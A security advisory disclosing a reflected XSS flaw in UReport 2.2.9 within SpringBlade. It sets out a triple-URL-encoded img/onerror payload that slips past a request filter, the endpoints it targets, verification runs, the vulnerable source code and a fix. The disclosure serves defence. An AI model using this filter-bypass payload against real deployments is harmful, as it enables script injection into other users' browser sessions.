# UReport decoded exception-message reflected XSS

## Summary

Decoded file and _u values enter exception messages that UReportServlet.service writes directly to a 500 response without HTML encoding or a safe Content-Type.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan (钟广源), Fudan University**

## Attack prerequisites and impact

Authenticated attacker; victim opens a crafted UReport error-path URL.

Verified flow: `triple-encoded file/_u -> double decode -> exception message -> pw.write(errorMsg) in a sniffable response`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Triple-encode an event-capable HTML marker so the request filter sees only encoded data.
2. Send it as a non-provider file to saveReportFile or as _u to loadData/loadPagePaper.
3. Confirm HTTP 500, no safe Content-Type, and the decoded marker in the response body.

Sanitized request shape used during verification:

```http
GET <BASE_URL>/blade-report/ureport/designer/saveReportFile
blade-auth: bearer <JWT>
?file=xxURLENCODE×3('<img src=x onerror=self[`al`+`ert`](`gt48261022n4c`)>')

GET <BASE_URL>/blade-report/ureport/preview/loadData
blade-auth: bearer <JWT>
?_u=URLENCODE×3('<img src=x onerror=self[`al`+`ert`](`gt48261022r45c`)>')
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `n4a / r45a` | 500; raw HTML; no safe MIME | **PASS** |
| 2 | `n4b / r45b` | 500; raw HTML; no safe MIME | **PASS** |
| 3 | `n4c / r45c` | 500; raw HTML; no safe MIME | **PASS** |

```text
Run-3 bodies:
File [xx<img ... gt48261022n4c>] not found available report provider.
Report [<img ... gt48261022r45c>] not support.

HTTP status: 500. A safe HTML/text Content-Type was absent.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
DesignerServletAction.java:163-175 / HtmlPreviewServletAction.java:178-254
file = ReportUtils.decodeFileName(file);
throw new ReportDesignException("File [" + file + "] not found ...");

UReportServlet.java:81-92
catch (Exception ex) {
    String errorMsg = buildExceptionMessage(ex);
    pw.write(errorMsg);
}
```

Root cause: Repeated decoding restores filtered markup inside an exception string, and the generic servlet error handler writes it without encoding or a safe media type.

## Recommended remediation

Do not reflect decoded identifiers. Return a fixed JSON/text error with an explicit Content-Type and HTML-encode any value that must enter HTML.

## References

- Official source: https://github.com/youseries/ureport

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are public-safe renderings produced from saved raw HTTP/DOM/database evidence; they are not represented as live browser screenshots.

### Sanitized reproduction

![CAN-04 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-04/01-reproduction.png)

### Three-run success proof

![CAN-04 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-04/02-success-proof.png)

### Source-to-Sink evidence

![CAN-04 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-04/03-source-sink.png)
